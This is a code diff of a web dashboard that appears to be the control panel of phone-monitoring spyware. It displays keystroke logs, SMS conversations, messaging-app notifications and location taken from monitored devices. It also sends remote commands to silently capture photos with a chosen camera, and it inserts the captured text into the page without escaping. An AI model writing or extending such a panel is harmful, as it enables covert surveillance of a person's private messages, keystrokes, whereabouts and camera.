-                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`;
-                                } else if (fullText.includes('messenger')) {
-                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="url(#messenger-gradient)"><defs><linearGradient id="messenger-gradient" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00c6ff;stop-opacity:1" /><stop offset="100%" style="stop-color:#0072ff;stop-opacity:1" /></linearGradient></defs><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10c.83 0 1.63-.1 2.4-.3.4-.1.8.1.9.5.3.8.9 1.4 1.7 1.7.4.1.8-.1.9-.5.8-2.1.2-4.5-1.5-5.9C15.1 16.2 13.6 15 12 15c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3V9.5c0-1.93-1.57-3.5-3.5-3.5S8.5 7.57 8.5 9.5H12c.83 0 1.5.67 1.5 1.5s-.67 1.5-1.5 1.5H6v-2c0-3.31 2.69-6 6-6s6 2.69 6 6v5.5c0 2.04-1.21 3.83-3 4.65.2.03.4.05.6.05 5.52 0 10-4.48 10-10S17.52 2 12 2z"/></svg>`;
-                                } else if (fullText.includes('instagram')) {
-                                    appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><defs><radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%"><stop offset="0%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="5%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="45%" style="stop-color: #fd5949; stop-opacity: 1;" /><stop offset="60%" style="stop-color: #d6249f; stop-opacity: 1;" /><stop offset="90%" style="stop-color: #285AEB; stop-opacity: 1;" /></defs><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.85s-.011 3.584-.069 4.85c-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07s-3.584-.012-4.85-.07c-3.252-.148-4.771-1.691-4.919-4.919-.058-1.265-.069-1.645-.069-4.85s.011-3.584.069-4.85c.149-3.225 1.664-4.771 4.919-4.919C8.416 2.175 8.796 2.163 12 2.163zm0 1.44c-3.117 0-3.483.01-4.692.066-2.93.134-4.21 1.42-4.344 4.344-.056 1.21-.066 1.575-.066 4.692s.01 3.483.066 4.692c.134 2.923 1.414 4.21 4.344 4.344 1.21.056 1.575.066 4.692.066s3.483-.01 4.692-.066c2.93-.134 4.21-1.42 4.344-4.344.056-1.21.066-1.575.066-4.692s-.01-3.483-.066-4.692c-.134-2.923-1.414-4.21-4.344-4.344-1.21-.056-1.575-.066-4.692-.066zM12 6.883c-2.825 0-5.117 2.292-5.117 5.117s2.292 5.117 5.117 5.117 5.117-2.292 5.117-5.117-2.292-5.117-5.117-5.117zm0 8.792c-2.03 0-3.675-1.645-3.675-3.675s1.645-3.675 3.675-3.675 3.675 1.645 3.675 3.675-1.645 3.675-3.675 3.675zM18.833 6.167a1.44 1.44 0 1 1-2.88 0 1.44 1.44 0 0 1 2.88 0z" fill="url(#instagram-gradient)"/></svg>`;
-                                }
-
-                                contentHTML += `
-                                    <div class="notification-card">
-                                        <div class="notification-header">
-                                            <div class="notification-icon">${appIcon}</div>
-                                            <strong class="notification-title">${notif.title || 'Notification'}</strong>
-                                        </div>
-                                        <p class="notification-body">${notif.text || ''}</p>
-                                        <div class="notification-footer">${notif.dateTime || ''}</div>
-                                    </div>
-                                `;
-                            }
-                        });
-                        contentHTML += '</div>';
-                        break;
+                    case 'location': let mapLink = ''; if (data.latitude && data.longitude) { mapLink = `<a href="https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}" target="_blank" class="map-link"><span>View on Google Maps</span></a>`; } contentHTML = `<div class="location-card" style="background-color: var(--secondary-dark); padding: 1.5rem; border-radius: 10px;"><div style="display: flex; align-items: flex-start; gap: 1rem; padding: 1rem 0; border-bottom: 1px solid var(--border-color);"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 10c0 6-8 12-8 12s-8-6-8-12a8 8 0 0 1 16 0Z"/><circle cx="12" cy="10" r="3"/></svg><div><strong>Address</strong><br><span>${data.address || 'N/A'}</span></div></div><div style="display: flex; align-items: flex-start; gap: 1rem; padding: 1rem 0;"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><div><strong>Time</strong><br><span>${data.dateTime || 'N/A'}</span></div></div>${mapLink}</div>`; break;
+                    case 'keylogger': contentHTML = '<div class="keylog-list" style="display: flex; flex-direction: column; gap: 1rem;">'; Object.values(data).reverse().forEach(log => { if (log && log.keyText) { const parts = log.keyText.split(' |'); const time = parts[0] || ''; const action = (parts[1] || '').replace(/[()]/g, ''); const text = parts[2] || ''; contentHTML += `<div style="background-color: var(--secondary-dark); padding: 1rem; border-radius: 8px; display: flex; justify-content: space-between; align-items: center;"><div>${action}: <strong>${text}</strong></div><small>${time}</small></div>`; } }); contentHTML += '</div>'; break;
+                    case 'sms': contentHTML = '<div class="chat-container" style="display: flex; flex-direction: column; gap: 1rem; padding: 1rem;">'; Object.values(data).reverse().forEach(sms => { if (sms) { const isOutgoing = sms.type === 2; contentHTML += `<div style="padding: 10px 15px; border-radius: 18px; max-width: 75%; word-wrap: break-word; background-color: ${isOutgoing ? 'var(--accent-blue)' : 'var(--secondary-dark)'}; color: ${isOutgoing ? '#fff' : 'var(--text-primary)'}; align-self: ${isOutgoing ? 'flex-end' : 'flex-start'};"><div>${sms.smsBody || ''}</div><div style="font-size: 0.75rem; opacity: 0.7; margin-top: 5px; text-align: right;">${sms.dateTime || ''}${!isOutgoing ? ` from: ${sms.smsAddress || ''}` : ''}</div></div>`; } }); contentHTML += '</div>'; break;
+                    case 'notifications': contentHTML = '<div class="notification-list">'; Object.values(data).reverse().forEach(notif => { if (notif) { let appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>`; const fullText = `${notif.title || ''} ${notif.text || ''}`.toLowerCase(); if (fullText.includes('whatsapp')) { appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="#25D366"><path d="M19.78 4.22a10.4 10.4 0 0 0-14.9 0 10.4 10.4 0 0 0 0 14.9l-1.38 5.02 5.13-1.35a10.4 10.4 0 0 0 14.9 0 10.4 10.4 0 0 0 0-14.9zM12 20.9a8.8 8.8 0 0 1-4.5-1.2L4 21l1.3-3.5a8.8 8.8 0 1 1 6.7 3.4zM16.4 13.6c-.2-.1-.8-.4-1-.4s-.3-.1-.4.1-.4.4-.5.5-.2.1-.4 0c-.2-.1-1-1-1.8-1.8-.7-.6-1.1-1.4-.9-1.6s.2-.3.3-.4c.1-.1.2-.2.3-.3.1-.1 0-.2 0-.3s-1-2.3-1.3-3.2c-.3-.8-.6-1-.8-1s-.4-.1-.6-.1h-.3c-.2 0-.5.1-.7.3-.2.2-.8.8-1 2s-1.2 2.3-.9 3.3c.3 1 1.1 2.4 2.5 3.8 1.4 1.4 2.8 2.2 4.3 2.7 1.5.5 2.8.4 3.8.3.9-.1 2.3-1 2.6-1.9.3-.9.3-1.7.2-1.9s-.3-.3-.5-.4z"/></svg>`; } else if (fullText.includes('messenger')) { appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="url(#messenger-gradient)"><defs><linearGradient id="messenger-gradient" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#00c6ff;stop-opacity:1" /><stop offset="100%" style="stop-color:#0072ff;stop-opacity:1" /></linearGradient></defs><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10c.83 0 1.63-.1 2.4-.3.4-.1.8.1.9.5.3.8.9 1.4 1.7 1.7.4.1.8-.1.9-.5.8-2.1.2-4.5-1.5-5.9C15.1 16.2 13.6 15 12 15c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3V9.5c0-1.93-1.57-3.5-3.5-3.5S8.5 7.57 8.5 9.5H12c.83 0 1.5.67 1.5 1.5s-.67 1.5-1.5 1.5H6v-2c0-3.31 2.69-6 6-6s6 2.69 6 6v5.5c0 2.04-1.21 3.83-3 4.65.2.03.4.05.6.05 5.52 0 10-4.48 10-10S17.52 2 12 2z"/></svg>`; } else if (fullText.includes('instagram')) { appIcon = `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><defs><radialGradient id="instagram-gradient" cx="30%" cy="107%" r="150%"><stop offset="0%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="5%" style="stop-color: #fdf497; stop-opacity: 1;" /><stop offset="45%" style="stop-color: #fd5949; stop-opacity: 1;" /><stop offset="60%" style="stop-color: #d6249f; stop-opacity: 1;" /><stop offset="90%" style="stop-color: #285AEB; stop-opacity: 1;" /></defs><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.85s-.011 3.584-.069 4.85c-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07s-3.584-.012-4.85-.07c-3.252-.148-4.771-1.691-4.919-4.919-.058-1.265-.069-1.645-.069-4.85s.011-3.584.069-4.85c.149-3.225 1.664-4.771 4.919-4.919C8.416 2.175 8.796 2.163 12 2.163zm0 1.44c-3.117 0-3.483.01-4.692.066-2.93.134-4.21 1.42-4.344 4.344-.056 1.21-.066 1.575-.066 4.692s.01 3.483.066 4.692c.134 2.923 1.414 4.21 4.344 4.344 1.21.056 1.575.066 4.692.066s3.483-.01 4.692-.066c2.93-.134 4.21-1.42 4.344-4.344.056-1.21.066-1.575.066-4.692s-.01-3.483-.066-4.692c-.134-2.923-1.414-4.21-4.344-4.344-1.21-.056-1.575-.066-4.692-.066zM12 6.883c-2.825 0-5.117 2.292-5.117 5.117s2.292 5.117 5.117 5.117 5.117-2.292 5.117-5.117-2.292-5.117-5.117-5.117zm0 8.792c-2.03 0-3.675-1.645-3.675-3.675s1.645-3.675 3.675-3.675 3.675 1.645 3.675 3.675-1.645 3.675-3.675 3.675zM18.833 6.167a1.44 1.44 0 1 1-2.88 0 1.44 1.44 0 0 1 2.88 0z" fill="url(#instagram-gradient)"/></svg>`; } contentHTML += `<div class="notification-card"><div class="notification-header"><div class="notification-icon">${appIcon}</div><strong class="notification-title">${notif.title || 'Notification'}</strong></div><p class="notification-body">${notif.text || ''}</p><div class="notification-footer">${notif.dateTime || ''}</div></div>`; } }); contentHTML += '</div>'; break;
                 }
             }
             modalDataDisplayArea.innerHTML = contentHTML;
         }
 
+        // --- BUG FIXED Live Chat Logic ---
+        liveChatBtn.addEventListener('click', () => {
+            const { userId, childKey } = selectedChildInfo;
+            if (!userId) return;
+
+            chatModal.style.display = 'flex';
+            const chatMessagesArea = document.getElementById('chat-messages-area');
+
+            // Define the send message function within this scope
+            const sendMessage = () => {
+                const chatMessageInput = document.getElementById('chat-message-input'); // Get fresh reference
+                const messageText = chatMessageInput.value.trim();
+                if (messageText) {
+                    const messagesRef = ref(db, `chats/${userId}/${childKey}/messages`);
+                    push(messagesRef, {
+                        text: messageText, sender: 'user', timestamp: serverTimestamp()
+                    }).then(() => {
+                        push(messagesRef, {
+                             text: 'Your request is in the queue! 🚀\n\nThanks for getting in touch! We\'ve received your query and are already working on it.\n\nYou can expect a personal reply from our support team within 24 hours.', // Choose your preferred auto-reply
+                             sender: 'auto-reply', timestamp: serverTimestamp()
+                        });
+                    });
+                    chatMessageInput.value = '';
+                }
+            };
+
+            // Set up button and input listeners
+            const chatSendBtn = document.getElementById('chat-send-btn');
+            const chatMessageInput = document.getElementById('chat-message-input');
+            
+            // Clone and replace to remove old listeners, then add the new one
+            const newSendBtn = chatSendBtn.cloneNode(true);
+            chatSendBtn.parentNode.replaceChild(newSendBtn, chatSendBtn);
+            newSendBtn.addEventListener('click', sendMessage);
+
+            const newInput = chatMessageInput.cloneNode(true);
+            chatMessageInput.parentNode.replaceChild(newInput, chatMessageInput);
+            newInput.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') sendMessage();
+            });
+            newInput.focus();
+
+            // Set up the listener for displaying messages
+            const chatPath = `chats/${userId}/${childKey}/messages`;
+            const chatRef = ref(db, chatPath);
+
+            if (activeChatListener) off(activeChatListener.ref);
+            activeChatListener = { ref: chatRef };
+
+            onValue(chatRef, (snapshot) => {
+                chatMessagesArea.innerHTML = '';
+                const messages = snapshot.val();
+                if (messages) {
+                    const sortedKeys = Object.keys(messages).sort((a,b) => messages[a].timestamp - messages[b].timestamp);
+                    sortedKeys.forEach(key => {
+                        const message = messages[key];
+                        const bubble = document.createElement('div');
+                        bubble.classList.add('chat-bubble', message.sender);
+                        const time = message.timestamp ? new Date(message.timestamp).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) : '';
+                        bubble.innerHTML = `${message.text.replace(/\n/g, '<br>')}`; // Support line breaks
+                        bubble.innerHTML += `<span class="chat-time">${time}</span>`;
+                        chatMessagesArea.prepend(bubble);
+                    });
+                } else {
+                    chatMessagesArea.innerHTML = '<p style="text-align:center; padding: 2rem;">No messages yet. Start the conversation!</p>';
+                }
+            });
+        });
+        
         modalDataDisplayArea.addEventListener('click', (e) => {
             const button = e.target.closest('button');
             if (!button) return;
             const { userId, childKey } = selectedChildInfo;
             if (button.classList.contains('capture-photo-btn')) {
-                const facing = button.dataset.facing;
-                if (facing === undefined) return;
-
-                const paramsRef = ref(db, `user/${userId}/${childKey}/photo/params`);
-                
-                const span = button.querySelector('span');
-                const originalText = span.textContent;
-                button.disabled = true;
-                span.textContent = 'Sending...';
-
+                const facing = button.dataset.facing; if (facing === undefined) return;
+                const paramsRef = ref(db, `user/${userId}/${childKey}/photo/params`); const span = button.querySelector('span'); const originalText = span.textContent; button.disabled = true; span.textContent = 'Sending...';
                 update(paramsRef, { capturePhoto: true, facingPhoto: parseInt(facing) })
-                    .then(() => {
-                        span.textContent = 'Command Sent!';
-                        setTimeout(() => {
-                            span.textContent = originalText;
-                            button.disabled = false;
-                        }, 3000);
-                    })
-                    .catch((error) => {
-                        console.error("Error sending command: ", error);
-                        alert("Failed to send command. Please try again.");
-                        span.textContent = originalText;
-                        button.disabled = false;
-                    });
+                    .then(() => { span.textContent = 'Command Sent!'; setTimeout(() => { span.textContent = originalText; button.disabled = false; }, 3000); })
+                    .catch((error) => { console.error("Error sending command: ", error); alert("Failed to send command. Please try again."); span.textContent = originalText; button.disabled = false; });
             }
-            if (button.id === 'refresh-photos-btn') {
-                displayCategoryData('photo');
-            }
+            if (button.id === 'refresh-photos-btn') { displayCategoryData('photo'); }
         });
 
-        menuBtn.addEventListener('click', () => {
-            sidebar.classList.add('open');
-            overlay.style.display = 'block';
+        menuBtn.addEventListener('click', () => { sidebar.classList.add('open'); overlay.style.display = 'block'; });
+        overlay.addEventListener('click', () => { sidebar.classList.remove('open'); overlay.style.display = 'none'; });
+        
+        document.querySelectorAll('.modal-overlay').forEach(modal => {
+            modal.addEventListener('click', e => {
+                if (e.target.classList.contains('modal-overlay') || e.target.closest('.ok-btn') || e.target.closest('.modal-close-btn')) {
+                    const targetId = e.target.closest('.modal-overlay').id;
+                    if (activeDataListener && targetId === 'data-modal') { off(activeDataListener.ref); activeDataListener = null; }
+                    if (activeChatListener && targetId === 'chat-modal') { off(activeChatListener.ref); activeChatListener = null; }
+                    modal.style.display = 'none';
+                }
+            });
         });
-        overlay.addEventListener('click', () => {
-            sidebar.classList.remove('open');
-            overlay.style.display = 'none';
-        });
-        modalCloseBtn.addEventListener('click', () => {
-            if (activeDataListener) {
-                activeDataListener();
-                activeDataListener = null;
-            }
-            dataModal.style.display = 'none';
-        });
-        comingSoonOkBtn.addEventListener('click', () => {
-            comingSoonModal.style.display = 'none';
-        });
+
     </script>
 </body>
 </html>
